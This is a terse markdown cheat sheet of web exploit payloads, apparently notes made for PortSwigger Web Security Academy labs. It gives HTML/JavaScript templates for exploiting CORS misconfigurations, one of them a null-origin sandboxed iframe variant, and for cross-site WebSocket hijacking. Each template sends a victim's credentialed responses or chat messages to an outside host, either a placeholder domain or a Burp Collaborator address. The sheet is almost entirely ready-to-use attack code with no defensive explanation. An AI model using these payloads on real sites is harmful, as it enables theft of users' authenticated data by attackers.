# Cors
## Requests with Cookies
```html
<script>
function reqListener() {
location = '//<DOMAIN>/key='+this.responseText;
}

var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('<METHOD>', '<URL>', true);
req.withCredentials = true;
req.send();
</script>
```

## Whitelists
**Note: The Origin header has nothing to do with non-controllable IP**
**Note: Still useful to check if server uses it**
### Null Origin
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
src="data:text/html, <script>
function reqListener() {
location = '//<DOMAIN>/key='+this.responseText;
}

var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('<METHOD>', '<URL>', true);
req.withCredentials = true;
req.send();
</script>"
/>
```

# WebSockets
```html
<script>
function reqListener(event) {
console.log(event.data);
fetch('https://z776gh5tgrwx8rt9ocpet25dj4pwdl.burpcollaborator.net/key',{method: 'POST', mode: 'no-cors', body: event.data});
}

var req = new WebSocket('wss://ac291f251ea833b7c0a02ef4000f00ef.web-security-academy.net/chat');
req.onopen = function() {
    req.send("READY");
  };
req.onmessage = reqListener;
</script>
```